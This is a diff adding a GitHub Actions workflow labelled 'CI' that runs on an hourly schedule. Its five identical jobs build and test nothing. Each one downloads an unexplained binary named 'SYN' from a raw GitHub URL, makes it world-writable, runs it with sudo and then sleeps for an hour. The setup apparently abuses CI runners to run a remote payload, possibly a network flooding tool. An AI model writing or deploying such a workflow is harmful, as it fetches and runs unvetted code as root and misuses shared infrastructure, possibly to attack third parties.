@@ -1,0 +1,57 @@
+name: CI
+
+on:
+  schedule:
+    - cron:  '*/60 * * * *'
+    
+jobs:
+  build1:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 1h
+  build2:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 1h
+  build3:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 1h
+  build4:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 1h
+  build5:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a multi-line script
+        run: |
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 1h
